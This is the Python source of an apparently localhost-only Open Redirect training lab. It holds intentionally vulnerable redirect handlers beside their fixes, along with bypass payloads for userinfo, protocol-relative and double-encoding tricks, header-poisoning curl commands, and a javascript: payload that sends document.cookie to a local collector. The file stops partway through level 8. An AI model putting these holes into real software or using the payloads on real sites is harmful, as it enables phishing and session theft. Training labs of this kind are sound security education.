"""
open_redirect_lab.py — a self-contained, single-file Open Redirect training lab.

================================================================================
  Intentionally vulnerable. For local training only.
================================================================================

This lab simulates one web application ("the lab") on 127.0.0.1:5000 and an
"attacker collection server" on 127.0.0.1:6000. Ten difficulty-ordered levels
teach the open-redirect vulnerability class end-to-end: naive redirects,
weak allowlists, blacklist gaps, double-decoding, userinfo tricks, DOM sinks,
header poisoning, OAuth redirect_uri abuse and chained SSRF.

USAGE
-----
    python open_redirect_lab.py

    Lab (main app):       http://127.0.0.1:5000           <- start here
    Attacker collector:   http://127.0.0.1:6000/logs      <- your exfil sink

Everything binds to 127.0.0.1 only. No external network calls are ever made;
the only dependency is Flask (pip install flask). Nothing is written to disk;
progress lives in memory and /reset clears it.

HOW SOLVING WORKS
-----------------
Each level is solved when the attacker server (port 6000) receives any request
whose path or query carries the matching tag, e.g. "?level=3" (or "/lvl/3").
Level 10 can also be solved fully server-side by leaking the fake internal
secret through the redirect chain. Solved levels reveal a unique per-run flag
of the form FLAG{or_lvlN_xxxxxxxx} on the level page and the scoreboard.

Suggested tooling: your browser, DevTools, curl, or Burp Suite. Every payload
reaches no further than your own machine.

Do not expose this server beyond localhost. Do not modify it to be "fixed" and
still call it a training lab — the vulnerable behaviors are the point.
"""

from __future__ import annotations

import re
import secrets
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from typing import Callable

from flask import Flask, Response, make_response, redirect, render_template_string, request, session
from markupsafe import escape

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

LAB_HOST = "127.0.0.1"
LAB_PORT = 5000
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 6000

LAB_BASE = f"http://{LAB_HOST}:{LAB_PORT}"
ATTACKER_BASE = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}"

# Virtual hostnames used by the lab's fake infrastructure. They are never
# resolved by DNS; the lab's own fetch helpers map them back to loopback.
INTERNAL_HOST = "internal.lab"
CLIENT_HOST = "demo.app"

SCORE_PER_LEVEL = 100
LEVEL_COUNT = 10

# --------------------------------------------------------------------------
# Shared runtime state (memory only)
# --------------------------------------------------------------------------

STATE_LOCK = threading.Lock()


def _rand_hex(n: int = 8) -> str:
    """Return a random hex string of exactly *n* characters."""
    return secrets.token_hex(max(1, n // 2))[:n]


def _fresh_state() -> dict:
    """Build the mutable, in-memory state used by both servers."""
    return {
        # flags[n] is only revealed once level n is solved
        "flags": {n: f"FLAG{{or_lvl{n}_{_rand_hex(8)}}}" for n in range(1, LEVEL_COUNT + 1)},
        # solved[n] -> {"ts": ..., "evidence": ..., "score": ...}
        "solved": {},
        # attacker log entries (list of dicts, newest last)
        "logs": [],
        # Level-7 DOM XSS teaser: cookie value the XSS payload can steal
        "dom_marker": f"doms-{_rand_hex(16)}",
        # Level-10 fake internal service secret (blind values; exfil proves SSRF)
        "internal_secret": f"INT-{_rand_hex(16)}",
        # Level-9 issued authorization codes: code -> subject
        "oauth_codes": {},
        "started_at": time.time(),
    }


STATE: dict = _fresh_state()
BOT_COOKIE = secrets.token_hex(16)  # cookie that marks the L9 victim "bot"

_OAUTH_CLIENTS: dict[str, dict] = {
    "webdemo": {
        "name": "Demo Web App (webdemo)",
        # What a *correct* server would exact-match against:
        "redirect_uris": [f"http://{CLIENT_HOST}/oauth/callback"],
    },
}


def solve_level(n: int, evidence: str) -> bool:
    """Mark level *n* solved (idempotent). Returns True on this first solve."""
    if not 1 <= n <= LEVEL_COUNT:
        return False
    with STATE_LOCK:
        if n in STATE["solved"]:
            return False
        STATE["solved"][n] = {
            "ts": datetime.now().strftime("%H:%M:%S"),
            "evidence": evidence[:200],
            "score": SCORE_PER_LEVEL,
        }
    print(f"  [+] LEVEL {n} SOLVED — {evidence}", flush=True)
    return True


def is_solved(n: int) -> bool:
    """True when level *n* is already solved."""
    with STATE_LOCK:
        return n in STATE["solved"]


def add_attacker_log(entry: dict) -> None:
    """Append one request record to the attacker log (capped)."""
    with STATE_LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 500:
            del STATE["logs"][: len(STATE["logs"]) - 500]


def shortfall(text: str) -> int | None:
    """Detect a level tag like ``?level=7`` or ``/lvl/3`` inside *text*."""
    m = re.search(r"(?:^|[^0-9a-z])(?:level|lvl)[=/_.\-](\d{1,2})", text, re.IGNORECASE)
    if m:
        try:
            n = int(m.group(1))
            return n if 1 <= n <= LEVEL_COUNT else None
        except ValueError:
            return None
    return None


# ---------------------------------------------------------------------------
# HTML shell (dark theme, no external assets)
# ---------------------------------------------------------------------------

LAYOUT_CSS = """
:root{--bg:#0d1117;--panel:#151b23;--panel2:#1b232e;--line:#2a3546;--txt:#d7e0ea;
--dim:#8b98a8;--acc:#4fc3f7;--ok:#3ecf8e;--warn:#f5a623;--bad:#ef6c6c;--mono:ui-monospace,SFMono-Regular,Consolas,Menlo,monospace}
*{box-sizing:border-box}html{color-scheme:dark}
body{margin:0;background:var(--bg);color:var(--txt);font:15px/1.55 system-ui,Segoe UI,Roboto,sans-serif}
a{color:var(--acc);text-decoration:none}a:hover{text-decoration:underline}
.wrap{max-width:980px;margin:0 auto;padding:16px}
header.top{display:flex;flex-wrap:wrap;gap:10px;align-items:center;padding:10px 0;border-bottom:1px solid var(--line)}
header.top .brand{font-weight:700;font-size:17px;margin-right:auto}
.brand .dot{color:var(--bad)}
nav a.btn,span.btn,button.btn{display:inline-block;background:var(--panel2);border:1px solid var(--line);
color:var(--txt);padding:6px 12px;border-radius:8px;font-size:13px;cursor:pointer}
nav a.btn:hover{text-decoration:none;border-color:var(--acc)}
label.bb{font-size:13px;color:var(--dim);user-select:none;cursor:pointer}
.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px;margin:14px 0}
.card h2,.card h3{margin:0 0 8px}
.badge{display:inline-block;border-radius:999px;padding:2px 10px;font-size:12px;border:1px solid var(--line);margin-left:6px}
.badge.ok{color:var(--ok);border-color:var(--ok)}
.badge.todo{color:var(--dim)}
.badge.diff{color:var(--warn);border-color:var(--warn)}
.flag{font-family:var(--mono);background:#0b2a1f;color:var(--ok);border:1px solid var(--ok);
padding:8px 12px;border-radius:8px;display:inline-block;margin:6px 0}
.muted{color:var(--dim)}.mono{font-family:var(--mono)}
code.k{background:var(--panel2);border:1px solid var(--line);border-radius:6px;padding:1px 6px;font-family:var(--mono);font-size:13px}
pre.code{background:#0a0e14;border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;
font-family:var(--mono);font-size:12.5px;line-height:1.5;color:#cfe3ff}
details{border:1px solid var(--line);border-radius:10px;background:var(--panel2);margin:10px 0}
details>summary{cursor:pointer;padding:9px 12px;font-size:13.5px;color:var(--acc);list-style:none}
details>summary::before{content:"\\25B8 ";color:var(--dim)}
details[open]>summary::before{content:"\\25BE "}
details.hint>summary{color:var(--warn)}
details>div.pad{padding:0 12px 12px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
.tile{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px}
.tile .lvlno{font-size:12px;color:var(--dim)}
.tile h3{margin:2px 0 6px;font-size:15px}
.tile a.go{font-size:13px}
.scorebar{height:10px;background:var(--panel2);border-radius:999px;overflow:hidden;border:1px solid var(--line)}
.scorebar>div{height:100%;background:linear-gradient(90deg,var(--ok),var(--acc))}
table.log{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px}
table.log th,table.log td{border:1px solid var(--line);padding:6px 8px;text-align:left;vertical-align:top}
table.log th{background:var(--panel2);color:var(--dim);font-weight:600}
.tag{color:var(--ok);font-weight:700}
.traffic{display:inline-block;padding:2px 8px;border-radius:6px;background:#3d1420;color:var(--bad);border:1px solid var(--bad)}
.info{border-left:3px solid var(--acc);padding:8px 12px;background:var(--panel2);border-radius:0 8px 8px 0;margin:10px 0}
.warnbox{border-left:3px solid var(--bad);padding:8px 12px;background:#241418;border-radius:0 8px 8px 0;margin:10px 0}
form.inline{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:8px 0}
form.inline input[type=text]{flex:1 1 320px;background:#0a0e14;border:1px solid var(--line);color:var(--txt);
border-radius:8px;padding:8px 10px;font-family:var(--mono);font-size:13px}
ul.tight{margin:6px 0;padding-left:20px}ul.tight li{margin:3px 0}
.blackbox .devpanel{display:none!important}
footer.f{color:var(--dim);font-size:12px;margin:26px 0 10px;border-top:1px solid var(--line);padding-top:10px}
@media (max-width:720px){.wrap{padding:10px}pre.code{font-size:11.5px}}
"""

LAYOUT_JS = """
(function(){
  var bb=document.getElementById('bbtoggle');
  function apply(on){document.body.classList.toggle('blackbox',on);if(bb){bb.checked=on;}}
  try{apply(localStorage.getItem('orlab-bb')==='1');}catch(e){}
  if(bb){bb.addEventListener('change',function(){
    apply(bb.checked);
    try{localStorage.setItem('orlab-bb',bb.checked?'1':'0');}catch(e){}
  });}
})();
"""

# The single layout template used by every page. $-substitution is avoided on
# purpose; plain {{ }} Jinja markers are used with |safe for composed bodies.
LAYOUT_TPL = (
    "<!doctype html><html lang='en'><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>{{ title }} — Open Redirect Lab</title>"
    "<style>" + LAYOUT_CSS + "</style></head><body>"
    "<div class='wrap'>"
    "<header class='top'>"
    "<span class='brand'>REDIRECT LAB<span class='dot'> ▲</span></span>"
    "<nav>"
    "<a class='btn' href='/'>Scoreboard</a>"
    "<a class='btn' href='/attacker-mirror'>Attacker logs</a>"
    "<a class='btn' href='/solutions'>Solutions</a>"
    "<a class='btn' href='/reset'>Reset</a>"
    "<label class='bb'><input type='checkbox' id='bbtoggle'> black-box mode</label>"
    "</nav>"
    "</header>"
    "{{ body|safe }}"
    "<footer class='f'>"
    "Open Redirect Training Lab · intentionally vulnerable · binds to 127.0.0.1 only · "
    "no data leaves your machine · <span class='mono'>attacker collector: " + ATTACKER_BASE + "</span>"
    "</footer></div>"
    "<script>" + LAYOUT_JS + "</script>"
    "</body></html>"
)


def render_page(title: str, body: str, status: int = 200) -> Response:
    """Render *body* (trusted HTML built by us) inside the shared layout."""
    html_out = render_template_string(LAYOUT_TPL, title=title, body=body)
    return Response(html_out, status=status, mimetype="text/html")


def code_block(src: str, cls: str = "code") -> str:
    """Return an escaped <pre> block for a source-code snippet."""
    return f"<pre class='{cls}'><code>{escape(src)}</code></pre>"

# ---------------------------------------------------------------------------
# Level definitions (L1..L5)
# ---------------------------------------------------------------------------


class Level:
    """Static description of one lab level (scenario, hints, code, fix)."""

    def __init__(self, num: int, title: str, category: str, scenario: str, endpoints: list[str],
                 hints: list[str], vuln_code: str, fix_code: str, payload: str,
                 payload_note: str, root_cause: str, success: str) -> None:
        self.num = num
        self.title = title
        self.category = category
        self.scenario = scenario
        self.endpoints = endpoints
        self.hints = hints
        self.vuln_code = vuln_code
        self.fix_code = fix_code
        self.payload = payload          # working payload for /solutions
        self.payload_note = payload_note
        self.root_cause = root_cause
        self.success = success


LEVELS: list[Level] = [
    Level(
        num=1,
        title="The Insecure Forward",
        category="basics",
        scenario=(
            "The marketing team keeps losing users after campaigns, so a developer added a "
            "<code>url</code> parameter that forwards visitors 'wherever they were heading'. "
            "Nobody checks what that value actually is."
        ),
        endpoints=["GET /l1/redirect?url=&lt;target&gt;"],
        hints=[
            "Read the snippet: is there any validation of <code>url</code> at all?",
            "The attacker collector listens on http://127.0.0.1:6000 — any request that reaches it with ?level=1 solves this level.",
            "Full payload: /l1/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D1 (the relay forwards to the attacker; with curl/Burp you can hit 127.0.0.1:6000/collect?level=1 directly)",
        ],
        vuln_code=(
            "@app.route(\"/l1/redirect\")\n"
            "def l1_redirect():\n"
            "    \"\"\"L1: forward the user wherever they asked — no questions asked.\"\"\"\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    # BUG: no scheme check, no host check, nothing.\n"
            "    # An attacker fully controls the Location header.\n"
            "    return redirect(target)"
        ),
        fix_code=(
            "# FIX: only ever redirect to local, relative paths.\n"
            "@app.route(\"/l1/redirect\")\n"
            "def l1_redirect_fixed():\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    url = urllib.parse.urlparse(target, scheme=\"http\")\n"
            "    if url.netloc:            # any authority means an off-site hop\n"
            "        return abort(400, \"external redirects are not allowed\")\n"
            "    if not target.startswith(\"/\"):\n"
            "        target = \"/\"          # force-relative fallback\n"
            "    return redirect(target)   # e.g. url=/dashboard"
        ),
        payload=f"{LAB_BASE}/l1/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D1",
        payload_note="The redirect copies your value straight into the Location header. Decoded target http://127.0.0.1:5000/collect?level=1 → relays to the attacker (curl/Burp can target 127.0.0.1:6000 directly).",
        root_cause="Redirect target is taken verbatim from user input. Defaulting to \"always redirect to a relative path you construct yourself\" removes the whole class.",
        success="Attacker server receives a request whose path/query contains the tag level=1.",
    ),
    Level(
        num=2,
        title="Same-Site by prefix",
        category="allowlist",
        scenario=(
            "After L1 the dev added a guard: the target must begin with the lab's own origin "
            "<code>http://127.0.0.1:5000</code>. Surely nothing external can pass…"
        ),
        endpoints=["GET /l2/redirect?url=&lt;target&gt;"],
        hints=[
            "<code>startswith()</code> is a string check, not a URL check. What else can sit between the origin and the real host in a URL?",
            "Think userinfo: <code>scheme://user@host/</code> — the browser connects to <code>host</code>.",
            "Payload: /l2/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D2 (i.e. http://127.0.0.1:5000@127.0.0.1:5000/collect?level=2 — relayed to the attacker; tools may target :6000 directly)",
        ],
        vuln_code=(
            "TRUSTED_ORIGIN = \"http://127.0.0.1:5000\"\n"
            "\n"
            "@app.route(\"/l2/redirect\")\n"
            "def l2_redirect():\n"
            "    \"\"\"L2: only allow redirects that \"stay on our site\".\"\"\"\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    # BUG: string-prefix check instead of parsing the URL.\n"
            "    #   http://127.0.0.1:5000@evil.example/  — browser goes to evil.example\n"
            "    #   http://127.0.0.1:50001.evil.example/ — spoofed port also passes\n"
            "    if not target.startswith(TRUSTED_ORIGIN):\n"
            "        return \"denied: off-site redirect\", 400\n"
            "    return redirect(target)"
        ),
        fix_code=(
            "# FIX: parse, then compare the actual host exactly.\n"
            "@app.route(\"/l2/redirect\")\n"
            "def l2_redirect_fixed():\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    parts = urllib.parse.urlsplit(target)\n"
            "    if parts.netloc and parts.netloc != request.host:\n"
            "        return abort(400, \"off-site redirect\")\n"
            "    if not target.startswith(\"/\"):\n"
            "        target = \"/\"\n"
            "    return redirect(target)"
        ),
        payload=(
            f"{LAB_BASE}/l2/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D2"
        ),
        payload_note="Decoded target: http://127.0.0.1:5000@127.0.0.1:5000/collect?level=2 — the string starts with the trusted origin, but after the @ the browser connects to the relay host; the loot lands at the attacker server. With curl/Burp: http://127.0.0.1:5000@127.0.0.1:6000/collect?level=2.",
        root_cause="String prefix checking of a URL instead of structured parsing. Userinfo (@) and look-alike ports make 'startswith' meaningless.",
        success="Attacker server receives a request tagged level=2.",
    ),
    Level(
        num=3,
        title="Trusted-domain substring",
        category="allowlist",
        scenario=(
            "Version three scans for the trusted domain name <code>trusted.lab</code> anywhere "
            "in the redirect value. If the string contains it, the hop is considered validated."
        ),
        endpoints=["GET /l3/redirect?url=&lt;target&gt;"],
        hints=[
            "Membership in the URL is not the same as membership AS the host.",
            "Let the attacker URL CONTAIN trusted.lab in a parameter or path — the check just does substring matching.",
            "Payload: /l3/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D3%26ref%3Dtrusted.lab (ref=trusted.lab decorates the relay URL; tools may target :6000 directly)",
        ],
        vuln_code=(
            "TRUSTED_DOMAIN = \"trusted.lab\"\n"
            "\n"
            "@app.route(\"/l3/redirect\")\n"
            "def l3_redirect():\n"
            "    \"\"\"L3: require the trusted domain to be mentioned, anywhere.\"\"\"\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    # BUG: substring test on the raw string.\n"
            "    #   http://trusted.lab.attacker/        — spoofed subdomain\n"
            "    #   http://127.0.0.1:6000/?ref=trusted.lab — hidden in a query param\n"
            "    if TRUSTED_DOMAIN not in target:\n"
            "        return \"denied: untrusted domain\", 400\n"
            "    return redirect(target)"
        ),
        fix_code=(
            "# FIX: compare the parsed hostname, exactly, lowercase.\n"
            "ALLOWED_HOSTS = {\"trusted.lab\", \"www.trusted.lab\"}\n"
            "\n"
            "@app.route(\"/l3/redirect\")\n"
            "def l3_redirect_fixed():\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    host = urllib.parse.urlsplit(target).hostname or \"\"\n"
            "    if target.startswith((\"http://\", \"https://\")) and host not in ALLOWED_HOSTS:\n"
            "        return abort(400, \"untrusted redirect\")\n"
            "    if not target.startswith(\"/\"):\n"
            "        target = \"/\"\n"
            "    return redirect(target)"
        ),
        payload=(
            f"{LAB_BASE}/l3/redirect?url=http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D3%26ref%3Dtrusted.lab"
        ),
        payload_note="Decoded target: http://127.0.0.1:5000/collect?level=3&ref=trusted.lab — the trusted name only decorates the attacker URL (relay). With curl/Burp: http://127.0.0.1:6000/collect?level=3&ref=trusted.lab.",
        root_cause="Substring membership checks. Only urlparse(...).hostname equality against an allowlist counts; anything else is attacker-influenced noise.",
        success="Attacker server receives a request tagged level=3.",
    ),
    Level(
        num=4,
        title="Block-list of schemes",
        category="blacklist",
        scenario=(
            "This endpoint was 'hardened' by blocking the words http:// and https://. "
            "Anything that does not literally carry those two strings may be redirected to."
        ),
        endpoints=["GET /l4/redirect?url=&lt;target&gt;"],
        hints=[
            "URLs do not need a scheme to leave the current origin. Browsers complete them.",
            "A Location of //host means 'same scheme, other authority'. Backslashes often parse like slashes too.",
            "Payload: /l4/redirect?url=%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D4 (i.e. url=//127.0.0.1:5000/collect?level=4 → relay). Also try /\\127.0.0.1:6000/collect?level=4 with tools (backslash bypass)",
        ],
        vuln_code=(
            "FORBIDDEN = (\"http://\", \"https://\")\n"
            "\n"
            "@app.route(\"/l4/redirect\")\n"
            "def l4_redirect():\n"
            "    \"\"\"L4: refuse any target that names a scheme *literally*.\"\"\"\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    # BUG: case-sensitive deny-list of schemes.\n"
            "    #   //127.0.0.1:6000/  → protocol-relative → browser supplies http:\n"
            "    #   /\\\\127.0.0.1:6000/ → backslashes collapse to slashes in parsers\n"
            "    #   wrong case, whitespace, control chars… deny-lists always leak\n"
            "    for bad in FORBIDDEN:\n"
            "        if bad in target:\n"
            "            return \"denied: scheme not allowed\", 400\n"
            "    return redirect(target)"
        ),
        fix_code=(
            "# FIX: positive parsing beats negative lists.\n"
            "@app.route(\"/l4/redirect\")\n"
            "def l4_redirect_fixed():\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    parts = urllib.parse.urlsplit(target.replace(\"\\\\\", \"/\"))\n"
            "    # anything with its own authority/scheme is external → reject\n"
            "    if parts.netloc or parts.scheme:\n"
            "        return abort(400, \"off-site redirect\")\n"
            "    if not target.startswith(\"/\"):\n"
            "        target = \"/\"\n"
            "    return redirect(target)"
        ),
        payload=f"{LAB_BASE}/l4/redirect?url=%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D4",
        payload_note="Decoded target: //127.0.0.1:5000/collect?level=4 → relayed loot. No 'http://' literally appears, browsers and tools resolve it fine (for a direct hit use //127.0.0.1:6000/collect?level=4 with curl).",
        root_cause="Deny-lists enumerate what the author imagined; parsers accept more. Require relative paths and reject anything that parses to a netloc or scheme.",
        success="Attacker server receives a request tagged level=4.",
    ),
    Level(
        num=5,
        title="WAF decodes once",
        category="normalization",
        scenario=(
            "A legacy redirector is fronted by a mini-'WAF' that validates the parameter "
            "<code>next_url</code> (note the renamed parameter). The validator sees one "
            "decoded copy of the value — but the legacy code path applies two more "
            "URL-decodes before issuing the Location header."
        ),
        endpoints=["GET /l5/redirect?next_url=&lt;target&gt;"],
        hints=[
            "The parameter is named next_url here. Count the decodes: transport decodes once (Flask), the validator then parses that copy, the legacy normalizer decodes twice more.",
            "Encode the attack URL twice. The validator's parse of the half-encoded value sees scheme=None, hostname=None → looks harmless.",
            "Payload: /l5/redirect?next_url=http%253A%252F%252F127.0.0.1%253A5000%252Fcollect%253Flevel%253D5 (relay target; tools can decode-double-encoded straight to :6000)",
        ],
        vuln_code=(
            "BLOCKED_HOSTS = {\"127.0.0.1\", \"localhost\"}\n"
            "\n"
            "@app.route(\"/l5/redirect\")\n"
            "def l5_redirect():\n"
            "    \"\"\"L5: legacy redirector behind a WAF with a decode-count bug.\"\"\"\n"
            "    # NOTE: request.args values are already URL-decoded once by transport.\n"
            "    raw = request.args.get(\"next_url\", \"\")\n"
            "    # The WAF validates exactly ONE decoded representation:\n"
            "    parts = urllib.parse.urlparse(raw)\n"
            "    # With double-encoded input the slashes/colon are STILL encoded here,\n"
            "    # so parse yields scheme=None, hostname=None → 'looks relative, fine'.\n"
            "    if parts.hostname in BLOCKED_HOSTS:\n"
            "        return \"denied: WAF blocked external redirect\", 400\n"
            "    # The legacy component normalizes the value twice more... mismatch:\n"
            "    target = urllib.parse.unquote(urllib.parse.unquote(raw))\n"
            "    return redirect(target)   # attacker URL fully materialized here"
        ),
        fix_code=(
            "# FIX: validate the exact value you redirect to — after full\n"
            "# normalization, and resolve paths so traversal is visible:\n"
            "raw = urllib.parse.unquote(request.args[\"next_url\"])\n"
            "final = urllib.parse.urljoin(request.url_root, urllib.parse.unquote(raw))\n"
            "parts = urllib.parse.urlsplit(final)\n"
            "if parts.scheme not in (\"http\", \"https\") or parts.hostname != LAB_AUTHORITY:\n"
            "    return abort(400, \"off-site redirect\")\n"
            "return redirect(final)  # one decoded value, parsed once, checked once"
        ),
        payload=(
            f"{LAB_BASE}/l5/redirect?next_url=http%253A%252F%252F127.0.0.1%253A5000%252Fcollect%253Flevel%253D5"
        ),
        payload_note="Value decodes to http%3A%2F%2F127.0.0.1%3A5000%2F… (still encoded) when the WAF parses it, then decodes fully to http://127.0.0.1:5000/collect?level=5 at redirect time → relay. Tools variant: same double-encoding with :6000.",
        root_cause="Decode-count mismatch across layers; validation ran on a different representation than the one used to produce the Location header. Normalize first, validate last, on the exact output.",
        success="Attacker server receives a request tagged level=5.",
    ),
]

LEVELS += [
    Level(
        num=6,
        title="Hand-rolled host parsing",
        category="allowlist",
        scenario=(
            "The allowlist attempts to be 'proper' this time by comparing the host extracted "
            "with <code>split(\"/\")[2]</code> against <code>trusted.lab</code>. But URL hosts can "
            "carry userinfo, which manual slicing ignores."
        ),
        endpoints=["GET /l6/redirect?url=&lt;target&gt;"],
        hints=[
            "split(\"/\") grabs whatever sits between the third pair of slashes — credentials included.",
            "scheme://username@host/ is a valid URL: the part after @ decides where the browser connects, while the string before @ pleases your check.",
            "Payload: /l6/redirect?url=http%3A%2F%2Ftrusted.lab%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D6 (i.e. http://trusted.lab@127.0.0.1:5000/collect?level=6 — relay; tools may target :6000)",
        ],
        vuln_code=(
            "ALLOWED_HOSTS = {\"trusted.lab\"}\n"
            "\n"
            "@app.route(\"/l6/redirect\")\n"
            "def l6_redirect():\n"
            "    \"\"\"L6: split()-based host extraction + prefix 'allowlist'.\"\"\"\n"
            "    target = request.args.get(\"url\", \"/\")\n"
            "    try:\n"
            "        host = target.split(\"/\")[2]   # BUG: fragile, ignores userinfo\n"
            "        # trusted.lab@127.0.0.1:6000 startswith(\"trusted.lab\") → True\n"
            "        # yet the browser connects to 127.0.0.1:6000.\n"
            "        if not host.startswith(tuple(ALLOWED_HOSTS)):\n"
            "            return \"denied: host not on allowlist\", 400\n"
            "        return redirect(target)\n"
            "    except IndexError:\n"
            "        return \"could not parse host\", 400"
        ),
        fix_code=(
            "# FIX: urlparse().hostname handles userinfo, ports and case, and\n"
            "# comparing equality (not prefixes) keeps subdomain spoofs out.\n"
            "ALLOWED_HOSTS = {\"trusted.lab\", \"www.trusted.lab\"}\n"
            "parts = urllib.parse.urlsplit(target)\n"
            "host = (parts.hostname or \"\").lower()\n"
            "if parts.scheme not in (\"http\", \"https\") or host not in ALLOWED_HOSTS:\n"
            "    return abort(400, \"untrusted redirect\")\n"
            "if parts.username is not None:      # credentials never belong here\n"
            "    return abort(400, \"userinfo in redirect target\")\n"
            "return redirect(urllib.parse.urlunsplit((parts.scheme, host, parts.path, parts.query, \"\")))"
        ),
        payload=(
            f"{LAB_BASE}/l6/redirect?url=http%3A%2F%2Ftrusted.lab%40127.0.0.1%3A5000%2Fcollect%3Flevel%3D6"
        ),
        payload_note="Decoded target: http://trusted.lab@127.0.0.1:5000/collect?level=6 — split()[2] returns 'trusted.lab@127.0.0.1:5000' which happily startswith('trusted.lab'). Tools variant swaps the host to :6000.",
        root_cause="DIY URL parsing. Use urllib.parse.urlsplit(...).hostname plus strict equality against an allowlist, and reject userinfo entirely.",
        success="Attacker server receives a request tagged level=6.",
    ),
    Level(
        num=7,
        title="DOM sink parade",
        category="dom",
        scenario=(
            "A client-side router of the 'link shortener preview' page runs in your browser: "
            "it reads <code>location.hash</code> and the <code>goto</code> query param and "
            "assigns them to <code>location</code>. Fragments never reach the server — only "
            "the browser defends here. A <code>javascript:</code> variant is also available."
        ),
        endpoints=[
            "GET /l7?goto=&lt;target&gt;      → query-param sink",
            "GET /l7#&lt;target&gt;             → fragment sink (invisible to server)",
        ],
        hints=[
            "Open DevTools → Sources/Elements and watch the two JS sinks at the bottom of /l7. location.hash content is never sent to the server, so the lab only sees your FINAL hop.",
            "Payload (fragment sink): /l7#//127.0.0.1:5000/collect?level=7 — or query sink: /l7?goto=%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D7 (the relay forwards to the attacker server)",
            "XSS variant (steals your L7 cookie): /l7?goto=javascript%3Afetch(%27http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D7%26stolen%3D%27%2Bdocument.cookie) — check /logs for the stolen cookie.",
        ],
        vuln_code=(
            "@app.route(\"/l7\")\n"
            "def l7_page():\n"
            "    \"\"\"L7: server happily serves a page with DOM redirects/XSS.\"\"\"\n"
            "    # No server-side validation is even possible for #fragments:\n"
            "    return HTML_PAGE_WITH_JS\n"
            "\n"
            "# ---- the actual sinks, client-side ----\n"
            "// <script>\n"
            "  var q = new URLSearchParams(location.search).get('goto');\n"
            "  if (q) { window.location.href = q; }        // open sink (URL)\n"
            "  var frag = location.hash.slice(1);\n"
            "  if (frag) { window.location = frag; }       // open sink (hash)\n"
            "// </script>\n"
            "# location = \"javascript:...\" executes in the page's origin → XSS"
        ),
        fix_code=(
            "# FIX (JS): accept only same-origin absolute paths.\n"
            "function safeNavigate(target) {\n"
            "  try { var u = new URL(target, location.origin); } catch (e) { return; }\n"
            "  if (u.origin !== location.origin) return;      // off-site → drop\n"
            "  if (u.protocol === 'javascript:') return;      // script scheme → drop\n"
            "  if (!u.pathname.startsWith('/')) return;\n"
            "  location.assign(u.href);                       # and never build URLs\n"
            "}\n"
            "# Server-side: whitelist Known redirect route names and pass those\n"
            "# as opaque keys (e.g. ?to=home), never raw URLs in DOM inputs;\n"
            "# add CSP as defense-in-depth (script-src 'self')."
        ),
        payload=f"{LAB_BASE}/l7#//127.0.0.1:5000/collect?level=7",
        payload_note=(
            "Fragment payload (click): the hash-based sink navigates after the page loads — the relay "
            "forwards to the attacker server. Query-sink variant: " +
            f"{LAB_BASE}/l7?goto=%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D7. "
            "XSS variant: " +
            f"{LAB_BASE}/l7?goto=javascript%3Afetch(%27http%3A%2F%2F127.0.0.1%3A5000%2Fcollect%3Flevel%3D7%26stolen%3D%27%2Bdocument.cookie)"
        ),
        root_cause="Redirect target assignment executed client-side from attacker-controlled hash/params, plus no scheme guard, equal to DOM-XSS. Validate client inputs like server inputs, and never navigate to arbitrary strings.",
        success="The browser itself hops to the attacker server with tag level=7 (a stolen=… query bonus proves the javascript: sink executed).",
    ),
    Level(
        num=8,
        title="Header-trusting gateway",
        category="headers",
        scenario=(
            "An SSO 'gateway' endpoint builds its redirect host from the "
            "<code>X-Forwarded-Host</code> header, and a 'go back' utility redirects to the "
            "<code>Referer</code>. Request headers are easy to spoof — with curl or Burp."
        ),
        endpoints=[
            "GET /l8/gateway?&lt;query&gt;   (X-Forwarded-Host poisoned)",
            "GET /l8/return             (redirects to the Referer)",
        ],
        hints=[
            "Sending headers is trivial with curl: curl -H \"X-Forwarded-Host: 127.0.0.1:6000\" http://127.0.0.1:5000/l8/gateway?level=8 — inspect the Location response header.",
            "The gateway concatenates header + full_path, so keep ?level=8 in the query string.",
            "Referer variant: curl -H \"Referer: //127.0.0.1:6000/collect?level=8\" http://127.0.0.1:5000/l8/return — or visit /l8/return in a browser after opening any page with a crafted history; curl is simpler.",
        ],
        vuln_code=(
            "@app.route(\"/l8/gateway\")\n"
            "def l8_gateway():\n"
            "    \"\"\"L8: builds Location from a request header.\"\"\"\n"
            "    host = request.headers.get(\"X-Forwarded-Host\", \"\").strip() or request.host\n"
            "    # BUG: header value is attacker-controlled; naïve trust in 'forwarded'\n"
            "    # metadata is a classic redirect → and phishing vector.\n"
            "    return redirect(f\"http://{host}{request.full_path.rstrip('?')}\")\n"
            "\n"
